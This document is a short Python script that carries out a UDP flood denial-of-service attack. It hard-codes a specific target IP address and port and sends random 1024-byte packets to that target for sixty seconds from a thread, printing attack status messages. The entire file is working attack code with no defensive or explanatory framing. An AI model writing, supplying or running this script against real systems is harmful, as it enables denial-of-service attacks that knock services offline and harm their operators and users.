import socket
import threading
import time
from random import randint

# Configuration
TARGET_IP = '34.0.14.194'  # Replace with the target IP address
TARGET_PORT = 10120         # Replace with the target port number
PACKET_SIZE = 1024       # Size of the UDP packet in bytes
DURATION = 60            # Duration of the attack in seconds

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def generate_random_payload(size):
    """Generate a random payload of a given size."""
    return bytes([randint(0, 255) for _ in range(size)])

def udp_flood(target_ip, target_port, packet_size, duration):
    """Perform a UDP flood attack on the specified target."""
    start_time = time.time()
    
    while time.time() - start_time < duration:
        payload = generate_random_payload(packet_size)
        sock.sendto(payload, (target_ip, target_port))
        
        # Print status every 10 seconds
        if int(time.time() - start_time) % 10 == 0:
            print(f"Sending packets to {target_ip}:{target_port}...")

# Main function to initiate the attack
def main():
    print(f"Starting UDP flood attack on {TARGET_IP}:{TARGET_PORT} for {DURATION} seconds.")
    
    # Start the attack in a separate thread
    attack_thread = threading.Thread(target=udp_flood, args=(TARGET_IP, TARGET_PORT, PACKET_SIZE, DURATION))
    attack_thread.start()
    
    # Wait for the attack to finish
    attack_thread.join()
    
    print("UDP flood attack completed.")

if __name__ == "__main__":
    main()
    
